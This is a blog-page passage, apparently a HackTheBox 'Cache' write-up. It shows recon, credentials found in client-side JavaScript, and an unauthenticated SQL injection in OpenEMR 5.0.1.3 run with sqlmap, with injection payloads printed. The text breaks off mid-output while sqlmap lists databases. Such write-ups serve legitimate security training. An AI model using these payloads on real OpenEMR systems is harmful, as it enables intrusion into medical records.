<!DOCTYPE html>
<html lang=en>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Cache just retired on Hackthebox, it’s a medium difficulty Linux box. This box was quite fun to solve and required to use a ton of vulnerabilities. This box actually made me worried a little about t">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox - Cache">
<meta property="og:url" content="https://hg8.sh/posts/cache/index.html">
<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
<meta property="og:description" content="Cache just retired on Hackthebox, it’s a medium difficulty Linux box. This box was quite fun to solve and required to use a ton of vulnerabilities. This box actually made me worried a little about t">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82154005-53054b80-986b-11ea-8ecb-557395356efb.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82216317-17c15600-9919-11ea-8049-cda2aa596e9c.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82219741-fdd64200-991d-11ea-9775-21fec8bff797.gif">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82220173-95d42b80-991e-11ea-9de5-54a00febb11e.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82221743-abe2eb80-9920-11ea-963b-38c7079bfa02.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82301325-5bb76800-99b8-11ea-8877-440fe1183b2b.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82302926-8e626000-99ba-11ea-9bc2-82560bb6af81.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82304337-7c81bc80-99bc-11ea-8c5c-59081c617820.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82304465-aaff9780-99bc-11ea-81f4-e22b66e34270.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82307383-93c2a900-99c0-11ea-8321-a09b198be3f2.png">
<meta property="article:published_time" content="2020-10-09T22:00:00.000Z">
<meta property="article:modified_time" content="2022-08-04T08:37:52.827Z">
<meta property="article:author" content="hg8">
<meta property="article:tag" content="linux">
<meta property="article:tag" content="cache">
<meta property="article:tag" content="openerm">
<meta property="article:tag" content="sqli">
<meta property="article:tag" content="John">
<meta property="article:tag" content="bcrypt">
<meta property="article:tag" content="RCE">
<meta property="article:tag" content="memcached">
<meta property="article:tag" content="docker">
<meta property="article:tag" content="CVE-2019-5736">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/82154005-53054b80-986b-11ea-8ecb-557395356efb.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
     
    <title>HackTheBox - Cache :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
    
<link rel="stylesheet" href="/css/style.css">

    
    
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/posts/blunder/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/posts/admirer/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
    </span>
    <br/>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ash-credentials"><span class="toc-number">1.2.</span> <span class="toc-text">Ash credentials</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HMS-Hospital-Management-System"><span class="toc-number">1.3.</span> <span class="toc-text">HMS (Hospital Management System)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injection-on-OpenEMR"><span class="toc-number">1.4.</span> <span class="toc-text">SQL Injection on OpenEMR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Admin-hash-bruteforce"><span class="toc-number">1.5.</span> <span class="toc-text">Admin hash bruteforce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OpenEMR-Authenticated-Remote-Code-Execution"><span class="toc-number">1.6.</span> <span class="toc-text">OpenEMR Authenticated Remote Code Execution</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-www-data-gt-ash"><span class="toc-number">1.7.</span> <span class="toc-text">Pivot www-data -&gt; ash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">2.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Memcached-enumeration"><span class="toc-number">2.2.</span> <span class="toc-text">Memcached enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-ash-gt-luffy"><span class="toc-number">2.3.</span> <span class="toc-text">Pivot ash -&gt; luffy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-Privilege-Escalation"><span class="toc-number">2.4.</span> <span class="toc-text">Docker Privilege Escalation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%9CIntended%E2%80%9D-way-to-root"><span class="toc-number">3.</span> <span class="toc-text">“Intended” way to root</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-container-escape-via-runC-CVE-2019-5736"><span class="toc-number">3.1.</span> <span class="toc-text">Docker container escape via runC (CVE-2019-5736)</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        <header id="header">
  <a href="/">
  
      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
  
    <span class="logo__mark"></span>
    <span class="logo__text">./hg8.sh</span>
    <span class="logo__cursor"></span>
  </a>
  <div id="nav">
    <ul>
      <li class="icon">
        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
      </li>
       
        <li><a href="/">Home</a></li>
       
        <li><a href="/about/">About</a></li>
       
        <li><a href="/archives/">Posts</a></li>
       
        <li><a href="/search/">Search</a></li>
      
    </ul>
  </div>
</header>

        
          <br>
          <br>
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        HackTheBox - Cache
    </h1>



    <div class="meta"> 
      
    <div class="postdate">
      
        <time datetime="2020-10-09T22:00:00.000Z" itemprop="datePublished">10-10-2020</time>
        
      
    </div>


      — Written by 
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">hg8</span>
      </span>
      —
      15 min read
    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <img width="578" alt="cache-hackthebox" src="https://user-images.githubusercontent.com/9076747/82154005-53054b80-986b-11ea-8ecb-557395356efb.png">

<p>Cache just retired on Hackthebox, it’s a medium difficulty Linux box. This box was quite fun to solve and required to use a ton of vulnerabilities. This box actually made me worried a little about the state of security in some medical web tools haha. </p>
<p><strong>Tl;Dr:</strong> To get the user flag you had to exploit an unauthenticated SQL Injection in a HMS (hospital management system) web app in order to retrieve the app admin hash. Once cracked you can use an authenticated remote code execution exploit to get a shell as <code>www-data</code>. Using credentials found on the first website you pivot to <code>ash</code> user and get the flag.<br>To get the root flag you first have to pivot to <code>luffy</code> user by extracting its password from a <code>memcached</code> instance. From <code>luffy</code> account you exploit a vulnerability in docker to achieve arbitrary file read and get a root shell. </p>
<p>Alright! Let’s get into the details now!</p>
<hr>
<p>First thing first, let’s add the box IP to the hosts file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.188 cache.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>and let’s start!</p>
<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC cache.htb</span><br><span class="line">Nmap scan report <span class="keyword">for</span> cache.htb (10.10.10.188)</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 12.49 seconds</span><br></pre></td></tr></table></figure>

<p>We have a classical web app running on port 80 and the SSH port 22 open.</p>
<p>Opening <a target="_blank" rel="noopener" href="http://cache.htb/">http://cache.htb</a> display a following page:</p>
<img width="867" alt="cache homepage" src="https://user-images.githubusercontent.com/9076747/82216317-17c15600-9919-11ea-8049-cda2aa596e9c.png">

<p>Since most pages are static let’s focus on the <code>Login</code> page. </p>
<h3 id="Ash-credentials"><a href="#Ash-credentials" class="headerlink" title="Ash credentials"></a>Ash credentials</h3><p>While trying to login with dummy credentials something immediately catch the eye:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/82219741-fdd64200-991d-11ea-9775-21fec8bff797.gif" alt="cache-login"></p>
<p>Well that’s a quite fast error message, looks like it doesn’t even make a request to the server to check the credentials…</p>
<p>Looking at the page source confirms our suspicions. A Javascript file is used to check on credentials in <code>jquery/functionality.js</code>:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> error_correctPassword = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">var</span> error_username = <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkCorrectPassword</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> Password = $(<span class="string">&quot;#password&quot;</span>).val();</span><br><span class="line">        <span class="keyword">if</span>(Password != <span class="string">&#x27;H@v3_fun&#x27;</span>)&#123;</span><br><span class="line">            alert(<span class="string">&quot;Password didn&#x27;t Match&quot;</span>);</span><br><span class="line">            error_correctPassword = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkCorrectUsername</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> Username = $(<span class="string">&quot;#username&quot;</span>).val();</span><br><span class="line">        <span class="keyword">if</span>(Username != <span class="string">&quot;ash&quot;</span>)&#123;</span><br><span class="line">            alert(<span class="string">&quot;Username didn&#x27;t Match&quot;</span>);</span><br><span class="line">            error_username = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $(<span class="string">&quot;#loginform&quot;</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        <span class="comment">/* Act on the event */</span></span><br><span class="line">        error_correctPassword = <span class="literal">false</span>;</span><br><span class="line">         checkCorrectPassword();</span><br><span class="line">         error_username = <span class="literal">false</span>;</span><br><span class="line">         checkCorrectUsername();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(error_correctPassword == <span class="literal">false</span> &amp;&amp; error_username ==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>This explains why the error message was so fast to appear. Also we got credentials: <code>ash</code>:<code>H@v3_fun</code>. Let’s login using those:</p>
<img width="867" alt="cache login net" src="https://user-images.githubusercontent.com/9076747/82220173-95d42b80-991e-11ea-9de5-54a00febb11e.png">

<p>Bummer nothing there. Let’s continue our investigation.</p>
<h3 id="HMS-Hospital-Management-System"><a href="#HMS-Hospital-Management-System" class="headerlink" title="HMS (Hospital Management System)"></a>HMS (Hospital Management System)</h3><p>While navigating the website, the <code>author.html</code> page informs us of an interesting information:</p>
<blockquote>
<p>ASH is a Security Researcher (Threat Research Labs), Security Engineer. Hacker, Penetration Tester and Security blogger. He is Editor-in-Chief, Author &amp; Creator of Cache. Check out his other projects like Cache:</p>
<p>HMS(Hospital Management System)<br>[…]</p>
</blockquote>
<p>Maybe the <code>HMS</code> project is available on this server. Let’s add the <code>hms</code> subdomain to our file to see if we can access it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.188 hms.cache.htb&quot;</span> &gt;&gt; /etc/hosts</span><br><span class="line">[hg8@archbook ~]$ curl hms.cache.htb</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Mon, 18 May 2020 13:59:28 GMT</span><br><span class="line">Server: Apache/2.4.29 (Ubuntu)</span><br><span class="line">Last-Modified: Wed, 06 May 2020 09:03:19 GMT</span><br><span class="line">ETag: <span class="string">&quot;2001-5a4f70909088c&quot;</span></span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Content-Length: 8193</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ curl cache.htb -I</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Mon, 18 May 2020 13:59:40 GMT</span><br><span class="line">Server: Apache/2.4.29 (Ubuntu)</span><br><span class="line">Last-Modified: Wed, 06 May 2020 09:03:19 GMT</span><br><span class="line">ETag: <span class="string">&quot;2001-5a4f70909088c&quot;</span></span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">Content-Length: 8193</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Type: text/html</span><br></pre></td></tr></table></figure>

<p>No luck it redirect to the main website. Maybe <code>hms.htb</code> then ?</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.188 hms.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>Bingo! We have access to a new CMS called <code>OpenEMR</code>:</p>
<img width="867" alt="cache openemr login panel" src="https://user-images.githubusercontent.com/9076747/82221743-abe2eb80-9920-11ea-963b-38c7079bfa02.png">

<p>Trying <code>ash</code> credentials doesn’t works, nor <code>openemr</code> default admin credentials.</p>
<p>Running <code>gobuster</code> yields a lot of results:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://hms.htb&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt -x php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/LICENSE (Status: 200)</span><br><span class="line">/admin.php (Status: 200)</span><br><span class="line">/ci (Status: 301)</span><br><span class="line">/cloud (Status: 301)</span><br><span class="line">/common (Status: 301)</span><br><span class="line">/config (Status: 301)</span><br><span class="line">/contrib (Status: 301)</span><br><span class="line">/controller.php (Status: 200)</span><br><span class="line">/controllers (Status: 301)</span><br><span class="line">/custom (Status: 301)</span><br><span class="line">/entities (Status: 301)</span><br><span class="line">/images (Status: 301)</span><br><span class="line">/index.php (Status: 302)</span><br><span class="line">/interface (Status: 301)</span><br><span class="line">/javascript (Status: 301)</span><br><span class="line">/library (Status: 301)</span><br><span class="line">/modules (Status: 301)</span><br><span class="line">/myportal (Status: 301)</span><br><span class="line">/patients (Status: 301)</span><br><span class="line">/portal (Status: 301)</span><br><span class="line">/public (Status: 301)</span><br><span class="line">/repositories (Status: 301)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">/services (Status: 301)</span><br><span class="line">/setup.php (Status: 200)</span><br><span class="line">/sites (Status: 301)</span><br><span class="line">/sql (Status: 301)</span><br><span class="line">/templates (Status: 301)</span><br><span class="line">/tests (Status: 301)</span><br><span class="line">/vendor (Status: 301)</span><br><span class="line">/version.php (Status: 200)</span><br></pre></td></tr></table></figure>

<p>The <code>admin.php</code> page is interesting since it give us the OpenEMR version (<code>5.0.1 (3)</code>) :</p>
<img width="867" alt="cache openEMR admin page" src="https://user-images.githubusercontent.com/9076747/82301325-5bb76800-99b8-11ea-8877-440fe1183b2b.png">

<p>This <code>5.0.1.3</code> is actually pretty old, let’s search online to see if we can find any vulnerabilities for this version:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ searchsploit openemr</span><br><span class="line">------------------------------------------------------------ ----------------------------------</span><br><span class="line"> Exploit Title                                              |  Path</span><br><span class="line">                                                            | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------------ ----------------------------------</span><br><span class="line">[...]</span><br><span class="line">OpenEMR 5.0.1.3 - (Authenticated) Remote Code Execution     | exploits/php/webapps/45161.py</span><br><span class="line">------------------------------------------------------------ ----------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Looks good! A RCE exploit, except it’s authenticated… We will need to first find a way to authenticate to OpenEMR in order to use this exploit. </p>
<p>Maybe we can try to relaunch the installation page at <code>setup.php</code> to reconfigure the site with our own credential? Unfortunately, this doesn’t work and we get an error message saying the website have already been configured. </p>
<p>It’s also not possible to add a new site… Then what ?</p>
<p>Let’s search a bit more, maybe we missed vulnerabilities. Searching for “<em>OpenEMR 5.0.1.3</em>“ on Google returns an interesting paper that wasn’t available through <code>searchploit</code>:</p>
<blockquote>
<p>ProjectInsecurity-insecurity.sh<br><strong>OpenEMR v5.0.1.3 - Vulnerability Report</strong></p>
<p><a target="_blank" rel="noopener" href="https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf">https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf</a></p>
</blockquote>
<p>This paper presents a quite impressive list of vulnerabilities affecting OpenEMR 5.0.1.3:</p>
<img width="668" alt="OpenEMR vulnerability list" src="https://user-images.githubusercontent.com/9076747/82302926-8e626000-99ba-11ea-9bc2-82560bb6af81.png">

<p>Reading through the vulnerability list, we quickly understand that:</p>
<ul>
<li>All RCE vulnerability are authenticated</li>
<li>All Arbitrary File Read/Write are authenticated </li>
<li>CSRF to RCE is authenticated</li>
<li>Unrestricted File Upload are authenticated</li>
<li>All SQL Injection are authenticated</li>
</ul>
<p>At first it looks like we didn’t made a lot of progress here, but another vulnerability is worth checking : “<strong>Patient Portal Authentication Bypass</strong>“:</p>
<blockquote>
<p>An unauthenticated user is able to bypass the Patient Portal Login by simply navigating tothe registration page and modifying the requested url to access the desired page. Someexamples of pages in the portal directory that are accessible after browsing to theregistration page include:</p>
<ul>
<li>find_appt_popup_user.php</li>
<li>[…]</li>
</ul>
</blockquote>
<p>Well, this page is familiar isn’t ?</p>
<blockquote>
<p>SQL injection in find_appt_popup_user.php is caused by unsanitized user input from thecatid and providerid parameters.</p>
</blockquote>
<p>Linking the “<strong>Patient Portal Authentication Bypass</strong>“ and “<strong>SQL injection in find_appt_popup_user.php</strong>“ we should be able to retrieve database informations even while being unauthenticated. Let’s give a try.</p>
<h3 id="SQL-Injection-on-OpenEMR"><a href="#SQL-Injection-on-OpenEMR" class="headerlink" title="SQL Injection on OpenEMR"></a>SQL Injection on OpenEMR</h3><p>Heading to <code>http://hms.htb/portal/find_appt_popup_user.php</code> first redirects us to the Patient Login page. Since the Registration is open, we can create an account and browse back to <code>find_appt_popup_user.php</code>:</p>
<img width="896" alt="cache openemr find popup user" src="https://user-images.githubusercontent.com/9076747/82304337-7c81bc80-99bc-11ea-8c5c-59081c617820.png">

<p>From there we can quickly validate the SQL injection possibility:</p>
<img width="896" alt="cache openemr sql injection" src="https://user-images.githubusercontent.com/9076747/82304465-aaff9780-99bc-11ea-81f4-e22b66e34270.png">

<p>Let’s now use SQLMap to speed-up our injection process:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sqlmap -u <span class="string">&quot;http://hms.htb/portal/find_appt_popup_user.php?catid=1&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=fobps042o1oh4u325nqk3jnniv; OpenEMR=qsvth3m6bqdgnusejnn36bd1pe&quot;</span></span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.4.4<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [(]     | .<span class="string">&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [)]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[10:41:00] [INFO] heuristic (basic) test shows that GET parameter &#x27;</span>catid<span class="string">&#x27; might be injectable (possible DBMS: &#x27;</span>MySQL<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">[10:41:10] [INFO] GET parameter &#x27;</span>catid<span class="string">&#x27; is &#x27;</span>MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)<span class="string">&#x27; injectable</span></span><br><span class="line"><span class="string">[10:41:21] [INFO] GET parameter &#x27;</span>catid<span class="string">&#x27; appears to be &#x27;</span>MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<span class="string">&#x27; injectable</span></span><br><span class="line"><span class="string">[10:41:41] [INFO] target URL appears to be UNION injectable with 1 columns</span></span><br><span class="line"><span class="string">GET parameter &#x27;</span>catid<span class="string">&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N]</span></span><br><span class="line"><span class="string">sqlmap identified the following injection point(s) with a total of 66 HTTP(s) requests:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: catid (GET)</span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span></span><br><span class="line"><span class="string">    Payload: catid=1&#x27;</span> AND (SELECT 2341 FROM(SELECT COUNT(*),CONCAT(0x71706b6b71,(SELECT (ELT(2341=2341,1))),0x71716b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND <span class="string">&#x27;Mfzh&#x27;</span>=<span class="string">&#x27;Mfzh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: catid=1&#x27;</span> AND (SELECT 3684 FROM (SELECT(SLEEP(5)))YmTR) AND <span class="string">&#x27;ApVK&#x27;</span>=<span class="string">&#x27;ApVK</span></span><br><span class="line"><span class="string">---</span></span><br></pre></td></tr></table></figure>

<p>Let’s list the databases:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sqlmap -u <span class="string">&quot;http://hms.htb/portal/find_appt_popup_user.php?catid=1&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=fobps042o1oh4u325nqk3jnniv; OpenEMR=qsvth3m6bqdgnusejnn36bd1pe&quot;</span> --dbs</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.4.4<span class="comment">#stable&#125;</span></span><br><span class="line">|_ -| . [<span class="string">&quot;]     | .&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [)]_|_|_|__,|  _|</span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[10:44:25] [INFO] fetching database names</span></span><br><span class="line"><span class="string">[10:44:25] [INFO] retrieved: 